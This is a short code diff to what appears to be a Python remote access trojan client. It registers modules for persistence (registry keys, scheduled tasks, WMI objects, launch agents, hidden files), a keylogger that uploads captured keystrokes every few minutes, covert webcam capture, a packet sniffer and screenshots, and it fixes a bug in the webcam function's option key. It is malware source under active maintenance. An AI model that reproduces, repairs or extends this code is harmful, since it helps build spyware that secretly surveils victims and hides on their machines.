@@ -759,22 +759,29 @@ class Client(object):
         return fx
 
     def module(fx, mx=__modules__):
+
+        
         fx.status = True
         if fx.func_name is 'persistence':
             fx.platforms = ['win32','darwin']
             fx.options = {'methods': ['registry key', 'scheduled task', 'wmi object', 'startup file', 'hidden file'] if os.name is 'nt' else ['launch agent', 'hidden file']}
+
         elif fx.func_name is 'keylogger':
             fx.platforms = ['win32','darwin','linux2']
             fx.options = {'max_bytes': 1024, 'next_upload': time.time() + 300.0, 'buffer': bytes(), 'window': None}
+
         elif fx.func_name is 'webcam':
             fx.platforms = ['win32']
             fx.options = {'image': True, 'video': bool()}
+
         elif fx.func_name is 'packetsniffer':
             fx.platforms = ['darwin','linux2']
             fx.options  = { 'next_upload': time.time() + 300.0, 'buffer': []}
+
         elif fx.func_name is 'screenshot':
             fx.platforms = ['win32','linux2','darwin']
             fx.options = {}
+
         mx.update({fx.func_name: fx})
         return fx
 
@@ -817,7 +824,7 @@ class Client(object):
 
     @module
     def webcam(self):
-        if self.webcam.options['video mode']:
+        if self.webcam.options['video']:
             result = self.webcam_video()
         else:
             result = self.webcam_image()
